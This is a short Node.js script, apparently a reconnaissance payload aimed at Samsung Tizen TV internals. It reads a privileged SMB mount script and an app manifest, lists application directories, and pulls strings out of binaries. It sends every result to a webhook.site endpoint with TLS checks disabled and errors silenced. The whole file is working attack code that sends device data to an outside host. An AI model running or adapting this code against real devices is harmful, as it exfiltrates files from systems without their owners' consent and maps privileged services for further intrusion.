var fs = require('fs');
var https = require('https');
var TOKEN = '03471c36-4d0f-4455-ae08-78adca120821';
function send(p, b) {
    try {
        var r = https.request({
            hostname: 'webhook.site',
            path: '/' + TOKEN + '/' + p,
            method: 'POST',
            rejectUnauthorized: false
        }, function () {});
        r.on('error', function () {});
        r.end(b);
    } catch (e) {}
}
function read(p, max) {
    try {
        var s = fs.readFileSync(p, 'utf8');
        send('probe', p + ' len=' + s.length + '\n' + s.slice(0, max));
    } catch (e) {
        send('probe', p + ' ERR ' + e);
    }
}
function list(p) {
    try {
        send('probe', p + ': ' + fs.readdirSync(p).join(','));
    } catch (e) {
        send('probe', p + ' list ERR ' + e);
    }
}
function strings(p, max) {
    try {
        var b = fs.readFileSync(p);
        var s = b.toString('binary');
        var re = /[\x20-\x7e]{5,}/g;
        var out = [];
        var m;
        while ((m = re.exec(s)) && out.length < max) {
            if (/Shared|Folder|SAMBA|CIFS|mount|Content|samba/i.test(m[0])) out.push(m[0]);
        }
        send('probe', p + ' strings:\n' + out.join('\n'));
    } catch (e) {
        send('probe', p + ' ERR ' + e);
    }
}
read('/usr/apps/privileged-service/bin/mount.smb.sh', 12000);
list('/usr/apps/privileged-service/bin');
list('/usr/apps/com.samsung.tv.coba.remoteworkspace');
list('/usr/apps/com.samsung.tv.coba.remoteworkspace/shared/res');
read('/usr/apps/com.samsung.tv.coba.remoteworkspace/tizen-manifest.xml', 4000);
strings('/usr/apps/privileged-service/bin/remotepc_uilauncher', 150);
strings('/usr/apps/com.samsung.tv.coba.remoteworkspace/shared/res/Com.Samsung.TV.CoBA.Remoteworkspace.ni.dll', 150);
strings('/usr/apps/com.samsung.tv.coba.remoteworkspace/bin/Com.Samsung.TV.CoBA.Remoteworkspace.dll', 150);
